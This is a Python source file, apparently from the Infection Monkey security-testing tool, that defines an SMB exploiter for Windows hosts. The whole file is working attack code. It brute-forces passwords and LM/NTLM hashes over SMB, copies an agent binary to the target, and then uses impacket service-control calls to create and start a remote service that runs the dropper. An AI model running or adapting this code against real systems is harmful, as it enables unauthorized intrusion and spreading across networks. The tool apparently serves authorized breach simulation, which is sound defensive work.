from logging import getLogger

from impacket.dcerpc.v5 import scmr, transport
from impacket.dcerpc.v5.scmr import DCERPCSessionError

from common.common_consts.timeouts import LONG_REQUEST_TIMEOUT
from common.utils.attack_utils import ScanStatus, UsageEnum
from infection_monkey.exploit.HostExploiter import HostExploiter
from infection_monkey.exploit.tools.helpers import get_agent_dest_path
from infection_monkey.exploit.tools.smb_tools import SmbTools
from infection_monkey.model import DROPPER_CMDLINE_DETACHED_WINDOWS, MONKEY_CMDLINE_DETACHED_WINDOWS
from infection_monkey.telemetry.attack.t1035_telem import T1035Telem
from infection_monkey.utils.brute_force import (
    generate_brute_force_combinations,
    get_credential_string,
)
from infection_monkey.utils.commands import build_monkey_commandline
from infection_monkey.utils.threading import interruptable_iter

logger = getLogger(__name__)


class SMBExploiter(HostExploiter):
    _TARGET_OS_TYPE = ["windows"]
    _EXPLOITED_SERVICE = "SMB"
    KNOWN_PROTOCOLS = {
        "139/SMB": (r"ncacn_np:%s[\pipe\svcctl]", 139),
        "445/SMB": (r"ncacn_np:%s[\pipe\svcctl]", 445),
    }
    USE_KERBEROS = False
    SMB_SERVICE_NAME = "InfectionMonkey"

    def _exploit_host(self):
        agent_binary = self.agent_repository.get_agent_binary(self.host.os["type"])
        dest_path = get_agent_dest_path(self.host, self.options)
        creds = generate_brute_force_combinations(self.options["credentials"])

        for user, password, lm_hash, ntlm_hash in interruptable_iter(creds, self.interrupt):
            creds_for_log = get_credential_string([user, password, lm_hash, ntlm_hash])

            try:
                # copy the file remotely using SMB
                remote_full_path = SmbTools.copy_file(
                    self.host,
                    agent_binary,
                    dest_path,
                    user,
                    password,
                    lm_hash,
                    ntlm_hash,
                    self.options["smb_download_timeout"],
                )

                if remote_full_path is not None:
                    logger.info(
                        f"Successfully logged in to {self.host.ip_addr} using SMB "
                        f"with {creds_for_log}"
                    )
                    self.report_login_attempt(True, user, password, lm_hash, ntlm_hash)
                    self.add_vuln_port(
                        "%s or %s"
                        % (
                            SMBExploiter.KNOWN_PROTOCOLS["139/SMB"][1],
                            SMBExploiter.KNOWN_PROTOCOLS["445/SMB"][1],
                        )
                    )
                    self.exploit_result.exploitation_success = True
                    break
                else:
                    # failed exploiting with this user/pass
                    self.report_login_attempt(False, user, password, lm_hash, ntlm_hash)

            except Exception as exc:
                logger.error(
                    f"Error while trying to copy file using SMB to {self.host.ip_addr} with "
                    f"{creds_for_log}:{exc}"
                )
                continue

        if not self.exploit_result.exploitation_success:
            if self._is_interrupted():
                self._set_interrupted()
            else:
                logger.debug("Exploiter SmbExec is giving up...")
                self.exploit_result.error_message = "Failed to authenticate to the victim over SMB"

            return self.exploit_result

        # execute the remote dropper in case the path isn't final
        if remote_full_path.lower() != dest_path.lower():
            cmdline = DROPPER_CMDLINE_DETACHED_WINDOWS % {
                "dropper_path": remote_full_path
            } + build_monkey_commandline(
                self.host,
                self.current_depth - 1,
                dest_path,
            )
        else:
            cmdline = MONKEY_CMDLINE_DETACHED_WINDOWS % {
                "monkey_path": remote_full_path
            } + build_monkey_commandline(self.host, self.current_depth - 1)

        smb_conn = None
        for str_bind_format, port in SMBExploiter.KNOWN_PROTOCOLS.values():
            rpctransport = transport.DCERPCTransportFactory(str_bind_format % (self.host.ip_addr,))
            rpctransport.set_connect_timeout(LONG_REQUEST_TIMEOUT)
            rpctransport.set_dport(port)
            rpctransport.setRemoteHost(self.host.ip_addr)
            if hasattr(rpctransport, "set_credentials"):
                # This method exists only for selected protocol sequences.
                rpctransport.set_credentials(user, password, "", lm_hash, ntlm_hash, None)
            rpctransport.set_kerberos(SMBExploiter.USE_KERBEROS)

            scmr_rpc = rpctransport.get_dce_rpc()

            try:
                scmr_rpc.connect()
            except Exception as exc:
                logger.debug(
                    f"Can't connect to SCM on exploited machine {self.host}, port {port} : {exc}"
                )
                continue

            logger.debug(f"Connected to SCM on exploited machine {self.host}, port {port}")
            smb_conn = rpctransport.get_smb_connection()
            smb_conn.setTimeout(LONG_REQUEST_TIMEOUT)
            break

        if not smb_conn:
            msg = "Failed to establish an RPC connection over SMB"

            logger.warning(msg)
            self.exploit_result.error_message = msg

            return self.exploit_result

        scmr_rpc.bind(scmr.MSRPC_UUID_SCMR)
        resp = scmr.hROpenSCManagerW(scmr_rpc)
        sc_handle = resp["lpScHandle"]

        # start the monkey using the SCM
        try:
            resp = scmr.hRCreateServiceW(
                scmr_rpc,
                sc_handle,
                SMBExploiter.SMB_SERVICE_NAME,
                SMBExploiter.SMB_SERVICE_NAME,
                lpBinaryPathName=cmdline,
            )
        except DCERPCSessionError as err:
            if err.error_code == 0x431:
                logger.debug(f'SMB service "{SMBExploiter.SMB_SERVICE_NAME}" already exists')
                resp = scmr.hROpenServiceW(scmr_rpc, sc_handle, SMBExploiter.SMB_SERVICE_NAME)
            else:
                self.exploit_result.error_message = str(err)
                return self.exploit_result

        service = resp["lpServiceHandle"]
        try:
            scmr.hRStartServiceW(scmr_rpc, service)
            status = ScanStatus.USED
        except Exception:
            status = ScanStatus.SCANNED
            pass
        self.telemetry_messenger.send_telemetry(T1035Telem(status, UsageEnum.SMB))
        scmr.hRDeleteService(scmr_rpc, service)
        scmr.hRCloseServiceHandle(scmr_rpc, service)

        logger.info(
            "Executed monkey '%s' on remote victim %r (cmdline=%r)",
            remote_full_path,
            self.host,
            cmdline,
        )
        self.exploit_result.propagation_success = True

        self.add_vuln_port(
            "%s or %s"
            % (
                SMBExploiter.KNOWN_PROTOCOLS["139/SMB"][1],
                SMBExploiter.KNOWN_PROTOCOLS["445/SMB"][1],
            )
        )
        return self.exploit_result
